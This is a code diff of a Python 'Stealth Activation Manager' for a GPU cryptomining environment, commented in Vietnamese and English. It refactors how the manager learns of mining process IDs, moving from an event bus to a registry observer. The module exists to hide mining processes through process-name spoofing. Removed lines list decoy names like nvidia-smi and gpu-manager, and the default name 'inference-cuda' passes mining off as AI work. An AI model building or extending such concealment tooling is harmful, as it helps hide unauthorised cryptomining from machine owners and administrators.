@@ -3,18 +3,18 @@
 
 🔄 **[Stealth Activation Manager]** (trình quản lý kích hoạt ẩn danh)
 
-Centralized stealth activation system với **[EventBus Integration]** (tích hợp EventBus).
+Centralized stealth activation system với **[DirectPIDRegistry Integration]** (tích hợp DirectPIDRegistry).
 Tách biệt hoàn toàn logic STEALTH khỏi **gpu_mining** và **mining processes**.
 
 ⚠️ WORKFLOW:
-1. **EventBus Listener**: Lắng nghe `mining:*_pid_registered` events
+1. **DirectPIDRegistry Observer**: Quan sát process registration events  
 2. **Process Identification**: Xác định loại process (GPU) và PID  
 3. **Stealth Strategy Selection**: Chọn chiến lược stealth phù hợp
 4. **External + Self-Stealth**: Kết hợp cả external disguise và self-stealth
 5. **Monitoring & Recovery**: Giám sát và tự động recovery khi cần
 
 ✅ FEATURES:
-- Event-driven stealth activation
+- DirectPIDRegistry-driven stealth activation (replaces EventBus)
 - Support GPU processes only  
 - Fallback strategies when external stealth fails
 - Centralized logging & monitoring
@@ -36,7 +36,6 @@ sys.path.insert(0, str(project_root))
 # Import required modules
 try:
     from mining_environment.scripts.unified_logging import get_unified_logger
-    from mining_environment.scripts.auxiliary_modules.event_bus import EventBus
 except ImportError as e:
     print(f"❌ Failed to import required modules: {e}", file=sys.stderr)
     sys.exit(1)
@@ -47,237 +46,291 @@ class StealthActivationManager:
     **[Stealth Activation Manager]** (trình quản lý kích hoạt ẩn danh)
     
     Centralized system để kích hoạt **[Process Name Spoofing]** (giả mạo tên tiến trình)
-    cho mining processes thông qua **[EventBus Integration]** (tích hợp EventBus).
+    cho mining processes thông qua **[DirectPIDRegistry Integration]** (tích hợp DirectPIDRegistry).
     """
     
-    def __init__(self, event_bus: EventBus, logger: Optional[logging.Logger] = None):
+    def __init__(self, logger: Optional[logging.Logger] = None):
         """
-        Initialize Stealth Activation Manager.
+        Initialize Stealth Activation Manager với DirectPIDRegistry integration.
         
         Args:
-            event_bus: EventBus instance để listen for PID registration events
-            logger: Logger instance (optional)
+            logger: Optional logger instance
         """
-        self.event_bus = event_bus
         self.logger = logger or get_unified_logger('mining_environment.stealth_activation')
         
-        # **[Active Stealth Tracking]** (theo dõi stealth đang hoạt động)
+        # DirectPIDRegistry observer setup
+        self.direct_registry = None
+        self.registry_observer_active = False
+        
+        # Process tracking
         self.active_stealth_processes: Dict[int, Dict[str, Any]] = {}
-        self.stealth_lock = threading.Lock()
+        self.stealth_lock = threading.RLock()
         
-        # **[External Stealth System]** (hệ thống stealth ngoài) - simplified tracking
-        self.external_stealth_enabled = False
+        # Stealth strategies (simplified - external stealth handled by wrappers)
+        self.stealth_strategies = {
+            'gpu': self._handle_gpu_stealth
+        }
         
-        # **[Event Listeners]** (listeners sự kiện)
-        self.event_subscriptions: List[str] = []
-        
-        self.logger.info("🔒 [STEALTH-ACTIVATION] Stealth Activation Manager initialized")
+        self.logger.info("🔄 [STEALTH-ACTIVATION] Initialized with DirectPIDRegistry integration")
     
     def initialize(self) -> bool:
         """
-        Initialize stealth activation system với EventBus subscriptions.
+        Initialize stealth activation system với DirectPIDRegistry observer.
         
         Returns:
-            bool: True nếu initialization thành công
+            bool: True if initialization successful
         """
         try:
             self.logger.info("🚀 [STEALTH-ACTIVATION] Initializing stealth activation system...")
             
-            # **Step 1**: External stealth system removed - using gpu_plugins/cloaking/ instead
-            self.logger.info("🔧 [STEALTH-ACTIVATION] External stealth removed - using gpu_plugins/cloaking/ system")
+            # **Step 1**: Setup DirectPIDRegistry observer
+            self._setup_direct_registry_observer()
             
-            # **Step 2**: Setup EventBus subscriptions
-            self._setup_eventbus_subscriptions()
+            # **Step 2**: Initialize stealth strategies
+            self._initialize_stealth_strategies()
             
-            self.logger.info("✅ [STEALTH-ACTIVATION] Stealth activation system ready")
+            self.logger.info("✅ [STEALTH-ACTIVATION] Stealth activation system initialized successfully")
             return True
             
         except Exception as e:
             self.logger.error(f"❌ [STEALTH-ACTIVATION] Initialization failed: {e}")
             return False
     
-    def _initialize_external_stealth(self) -> bool:
-        """External stealth system removed - using gpu_plugins/cloaking/ instead."""
-        self.logger.info("🔧 [STEALTH-ACTIVATION] External stealth removed - using gpu_plugins/cloaking/ system")
-        return True
-    
-    def _setup_eventbus_subscriptions(self):
-        """Setup EventBus subscriptions for PID registration events."""
+    def _setup_direct_registry_observer(self):
+        """Setup DirectPIDRegistry observer for process registration events."""
         try:
-            self.logger.info("🔌 [STEALTH-ACTIVATION] Setting up EventBus subscriptions...")
+            self.logger.info("🔌 [STEALTH-ACTIVATION] Setting up DirectPIDRegistry observer...")
             
-            # CPU PID registration removed - GPU-only operations
-            
-            # Subscribe to GPU PID registration events  
-            self.event_bus.subscribe('mining:gpu_pid_registered', self._on_gpu_pid_registered)
-            self.event_subscriptions.append('mining:gpu_pid_registered')
-            
-            self.logger.info(f"✅ [STEALTH-ACTIVATION] EventBus subscriptions active: {len(self.event_subscriptions)} events")
-            
-        except Exception as e:
-            self.logger.error(f"❌ [STEALTH-ACTIVATION] EventBus subscription error: {e}")
-            raise
-    
-    # CPU PID registration handler removed - GPU-only operations
-    
-    def _on_gpu_pid_registered(self, event_data: Dict[str, Any]):
-        """
-        **[GPU PID Registration Handler]** (xử lý đăng ký PID GPU)
-        
-        Được gọi khi EventBus nhận được 'mining:gpu_pid_registered' event.
-        """
-        try:
-            role = event_data.get('role')
-            if role != 'real':
-                self.logger.warning(f"[STEALTH-ACTIVATION] Bỏ qua PID không phải real: {event_data}")
-                return
-
-            pid = event_data.get('pid')
-            process_name = event_data.get('process_name', 'inference-cuda')
-            
-            self.logger.info(f"🔔 [STEALTH-ACTIVATION] GPU PID registered: {pid} ({process_name})")
-            
-            # **CRITICAL**: Activate stealth for GPU process  
-            success = self._activate_process_stealth(
-                pid=pid,
-                process_name=process_name, 
-                process_type='GPU',
-                stealth_names=[
-                    "nvidia-smi", "cuda-gdb", "nvcc", "nvidia-ml-py",
-                    "nvidia-settings", "gpu-manager", "glxgears", 
-                    "vulkan-info", "mesa-loader", "drm-tip"
-                ]
-            )
-            
-            if success:
-                self.logger.info(f"✅ [STEALTH-ACTIVATION] GPU process PID {pid} stealth activated")  
-            else:
-                self.logger.error(f"❌ [STEALTH-ACTIVATION] GPU process PID {pid} stealth activation failed")
-                
-        except Exception as e:
-            self.logger.error(f"❌ [STEALTH-ACTIVATION] GPU PID handler error: {e}")
-    
-    def _activate_process_stealth(self, pid: int, process_name: str, process_type: str, stealth_names: List[str]) -> bool:
-        """
-        **[Core Stealth Activation Logic]** (logic kích hoạt stealth cốt lõi)
-        
-        Kết hợp cả **[External Stealth]** và **[Self-Stealth]** cho maximum protection.
-        
-        Args:
-            pid: Process ID to activate stealth for
-            process_name: Original process name  
-            process_type: 'GPU' only
-            stealth_names: List of decoy names for rotation
-            
-        Returns:
-            bool: True if stealth activation successful
-        """
-        with self.stealth_lock:
+            # **Import DirectPIDRegistry** (nhập DirectPIDRegistry)
             try:
-                self.logger.info(f"🔒 [STEALTH-ACTIVATION] Activating stealth for {process_type} PID {pid}")
+                from pid_logger.direct_registry import get_direct_registry
+                self.direct_registry = get_direct_registry()
                 
-                stealth_info = {
-                    'pid': pid,
-                    'original_name': process_name,
-                    'process_type': process_type,
-                    'external_stealth': False,  # Removed - using gpu_plugins/cloaking/
-                    'activation_time': time.time(),
-                    'stealth_names': stealth_names
-                }
-                
-                # **Strategy 1**: External stealth removed - using gpu_plugins/cloaking/ instead
-                self.logger.info(f"🔧 [STEALTH-ACTIVATION] External stealth removed - using gpu_plugins/cloaking/ for PID {pid}")
-                
-                # **Strategy 2**: Self-stealth functionality removed - process renaming handled by wrappers
-                # Note: Process renaming is now centralized in stealth_inference_cuda.py
-                
-                # **Record stealth activation**
-                self.active_stealth_processes[pid] = stealth_info
-                
-                # **Success if at least one method worked**
-                success = True  # Process renaming via wrappers, external stealth via gpu_plugins/cloaking/
+                # **Register observer** (đăng ký observer)
+                success = self.direct_registry.register_observer(self._on_process_registered)
                 
                 if success:
-                    self.logger.info(f"🎯 [STEALTH-ACTIVATION] {process_type} PID {pid} stealth activation complete")
-                    return True
+                    self.registry_observer_active = True
+                    self.logger.info("✅ [STEALTH-ACTIVATION] DirectPIDRegistry observer registered successfully")
                 else:
-                    self.logger.error(f"💥 [STEALTH-ACTIVATION] {process_type} PID {pid} all stealth methods failed")
-                    return False
+                    self.logger.error("❌ [STEALTH-ACTIVATION] Failed to register DirectPIDRegistry observer")
                     
-            except Exception as e:
-                self.logger.error(f"❌ [STEALTH-ACTIVATION] Critical error activating stealth for PID {pid}: {e}")
-                return False
+            except ImportError as import_err:
+                self.logger.error(f"❌ [STEALTH-ACTIVATION] DirectPIDRegistry import failed: {import_err}")
+                self.direct_registry = None
+                
+        except Exception as e:
+            self.logger.error(f"❌ [STEALTH-ACTIVATION] DirectPIDRegistry observer setup error: {e}")
+    
+    def _on_process_registered(self, process_info) -> None:
+        """
+        **[DirectPIDRegistry Observer Callback]** (callback quan sát DirectPIDRegistry)
+        
+        Được gọi khi DirectPIDRegistry nhận được process registration event.
+        
+        Args:
+            process_info: ProcessInfo object từ DirectPIDRegistry
+        """
+        try:
+            pid = process_info.pid
+            process_type = process_info.process_type
+            process_name = process_info.process_name
+            metadata = process_info.metadata or {}
+            
+            self.logger.info(f"🔔 [STEALTH-ACTIVATION] Process registered: PID={pid}, Type={process_type}, Name={process_name}")
+            
+            # **Filter GPU processes only** (chỉ xử lý GPU processes)
+            if process_type == "gpu":
+                # **Get process role** (lấy role của process)
+                role = metadata.get('role', 'real')
+                stealth_enabled = metadata.get('stealth_enabled', False)
+                
+                if role == 'real' and stealth_enabled:
+                    self.logger.info(f"🎯 [STEALTH-ACTIVATION] Activating stealth for real GPU process: PID={pid}")
+                    self._activate_process_stealth(pid, process_type, process_info)
+                else:
+                    self.logger.debug(f"🚫 [STEALTH-ACTIVATION] Skipping stealth for wrapper/non-stealth process: PID={pid}, Role={role}")
+            else:
+                self.logger.debug(f"🚫 [STEALTH-ACTIVATION] Ignoring non-GPU process: PID={pid}, Type={process_type}")
+                
+        except Exception as e:
+            self.logger.error(f"❌ [STEALTH-ACTIVATION] Process registration handler error: {e}")
+    
+    def _activate_process_stealth(self, pid: int, process_type: str, process_info) -> None:
+        """
+        **[Process Stealth Activation]** (kích hoạt stealth cho process)
+        
+        Args:
+            pid: Process ID
+            process_type: Type of process ('gpu')
+            process_info: ProcessInfo object from DirectPIDRegistry
+        """
+        try:
+            with self.stealth_lock:
+                # **Check if already active** (kiểm tra đã kích hoạt chưa)
+                if pid in self.active_stealth_processes:
+                    self.logger.info(f"⚠️ [STEALTH-ACTIVATION] Stealth already active for PID={pid}")
+                    return
+                
+                # **Track stealth activation** (theo dõi kích hoạt stealth)
+                stealth_data = {
+                    'pid': pid,
+                    'process_type': process_type,
+                    'process_name': process_info.process_name,
+                    'activation_time': time.time(),
+                    'stealth_strategy': process_type,
+                    'status': 'activating'
+                }
+                
+                self.active_stealth_processes[pid] = stealth_data
+                
+                # **Apply stealth strategy** (áp dụng chiến lược stealth)
+                strategy_func = self.stealth_strategies.get(process_type)
+                if strategy_func:
+                    strategy_func(process_info, stealth_data)
+                    stealth_data['status'] = 'active'
+                    self.logger.info(f"✅ [STEALTH-ACTIVATION] Stealth activated for PID={pid}")
+                else:
+                    stealth_data['status'] = 'failed'
+                    self.logger.error(f"❌ [STEALTH-ACTIVATION] No stealth strategy for process type: {process_type}")
+                    
+        except Exception as e:
+            self.logger.error(f"❌ [STEALTH-ACTIVATION] Stealth activation failed for PID={pid}: {e}")
+    
+    def _handle_gpu_stealth(self, process_info, stealth_data: Dict[str, Any]) -> None:
+        """
+        **[GPU Stealth Handler]** (xử lý stealth GPU)
+        
+        GPU stealth được xử lý bởi stealth wrapper, không cần external intervention.
+        """
+        try:
+            pid = process_info.pid
+            self.logger.info(f"🎮 [GPU-STEALTH] GPU process stealth handled internally by wrapper: PID={pid}")
+            
+            # **External stealth đã được xử lý bởi stealth_inference_cuda.py**
+            # Chỉ cần log và track trạng thái
+            
+            stealth_data.update({
+                'external_stealth': 'wrapper_handled',
+                'stealth_method': 'process_name_spoofing',
+                'stealth_wrapper': 'stealth_inference_cuda.py'
+            })
+            
+        except Exception as e:
+            self.logger.error(f"❌ [GPU-STEALTH] GPU stealth handling failed: {e}")
+    
+    def _initialize_stealth_strategies(self) -> None:
+        """Initialize available stealth strategies."""
+        try:
+            self.logger.info("🔧 [STEALTH-ACTIVATION] Initializing stealth strategies...")
+            
+            # **Simplified strategies** (chiến lược đơn giản)
+            # External stealth được xử lý bởi wrappers, chỉ cần tracking
+            
+            available_strategies = list(self.stealth_strategies.keys())
+            self.logger.info(f"✅ [STEALTH-ACTIVATION] Initialized {len(available_strategies)} stealth strategies: {available_strategies}")
+            
+        except Exception as e:
+            self.logger.error(f"❌ [STEALTH-ACTIVATION] Strategy initialization failed: {e}")
     
     def get_stealth_status(self) -> Dict[str, Any]:
         """
-        Get current stealth activation status.
+        Get current stealth status for all processes.
         
         Returns:
-            Dict with stealth status information
+            Dict containing stealth status information
         """
-        with self.stealth_lock:
-            return {
-                'external_stealth_enabled': False,  # Removed - using gpu_plugins/cloaking/
-                'active_processes': len(self.active_stealth_processes),
-                'processes': dict(self.active_stealth_processes),
-                'event_subscriptions': self.event_subscriptions.copy()
-            }
+        try:
+            with self.stealth_lock:
+                return {
+                    'active_processes': len(self.active_stealth_processes),
+                    'registry_observer_active': self.registry_observer_active,
+                    'processes': dict(self.active_stealth_processes)
+                }
+        except Exception as e:
+            self.logger.error(f"❌ [STEALTH-ACTIVATION] Status retrieval failed: {e}")
+            return {'error': str(e)}
     
-    def cleanup(self):
-        """Cleanup stealth activation manager and stop all stealth processes."""
+    def cleanup(self) -> None:
+        """Cleanup stealth activation manager."""
         try:
             self.logger.info("🧹 [STEALTH-ACTIVATION] Cleaning up stealth activation manager...")
             
-            # External stealth removed - cleanup handled by gpu_plugins/cloaking/
-            self.logger.info("🔧 [STEALTH-ACTIVATION] External stealth removed - cleanup handled by gpu_plugins/cloaking/")
+            # **Unregister DirectPIDRegistry observer** (hủy đăng ký observer)
+            if self.direct_registry and self.registry_observer_active:
+                # DirectPIDRegistry cleanup tự động khi process kết thúc
+                self.registry_observer_active = False
             
-            # Clear active processes
+            # **Clear active processes** (xóa active processes)
             with self.stealth_lock:
                 self.active_stealth_processes.clear()
             
-            self.logger.info("✅ [STEALTH-ACTIVATION] Stealth activation manager cleanup complete")
+            self.logger.info("✅ [STEALTH-ACTIVATION] Cleanup completed")
             
         except Exception as e:
-            self.logger.error(f"❌ [STEALTH-ACTIVATION] Cleanup error: {e}")
+            self.logger.error(f"❌ [STEALTH-ACTIVATION] Cleanup failed: {e}")
 
 
-# **[Global Stealth Activation Instance]** (instance kích hoạt stealth toàn cầu)
+# ✅ GLOBAL MANAGER INSTANCE
 _stealth_activation_manager: Optional[StealthActivationManager] = None
+_manager_lock = threading.RLock()
 
-def get_stealth_activation_manager(event_bus: EventBus) -> StealthActivationManager:
+
+def get_stealth_activation_manager() -> StealthActivationManager:
     """
-    Get or create global StealthActivationManager instance.
+    Get or create global stealth activation manager instance.
     
-    Args:
-        event_bus: EventBus instance
-        
     Returns:
-        StealthActivationManager: Global instance
+        StealthActivationManager: Global manager instance
     """
     global _stealth_activation_manager
     
-    if _stealth_activation_manager is None:
-        _stealth_activation_manager = StealthActivationManager(event_bus)
-        
-    return _stealth_activation_manager
+    with _manager_lock:
+        if _stealth_activation_manager is None:
+            _stealth_activation_manager = StealthActivationManager()
+        return _stealth_activation_manager
 
-def initialize_stealth_activation(event_bus: EventBus) -> bool:
+
+def initialize_stealth_activation(legacy_event_bus=None) -> bool:
     """
     Initialize global stealth activation system.
     
     Args:
-        event_bus: EventBus instance
+        legacy_event_bus: Legacy parameter for backward compatibility (ignored)
         
     Returns:
         bool: True if initialization successful
     """
-    manager = get_stealth_activation_manager(event_bus)
+    # **Ignore legacy EventBus parameter** (bỏ qua tham số EventBus cũ)
+    manager = get_stealth_activation_manager()
     return manager.initialize()
 
-def cleanup_stealth_activation():
+
+def cleanup_stealth_activation() -> None:
     """Cleanup global stealth activation system."""
     global _stealth_activation_manager
     
-    if _stealth_activation_manager:
-        _stealth_activation_manager.cleanup()
-        _stealth_activation_manager = None
+    with _manager_lock:
+        if _stealth_activation_manager:
+            _stealth_activation_manager.cleanup()
+            _stealth_activation_manager = None
+
+
+if __name__ == "__main__":
+    # **Test DirectPIDRegistry integration** (test tích hợp DirectPIDRegistry)
+    logging.basicConfig(level=logging.INFO)
+    
+    print("🧪 Testing Stealth Activation Manager with DirectPIDRegistry...")
+    
+    success = initialize_stealth_activation()
+    if success:
+        print("✅ Stealth Activation Manager initialized successfully")
+        
+        manager = get_stealth_activation_manager()
+        status = manager.get_stealth_status()
+        print(f"📊 Status: {status}")
+        
+        cleanup_stealth_activation()
+        print("🧹 Cleanup completed")
+    else:
+        print("❌ Stealth Activation Manager initialization failed")
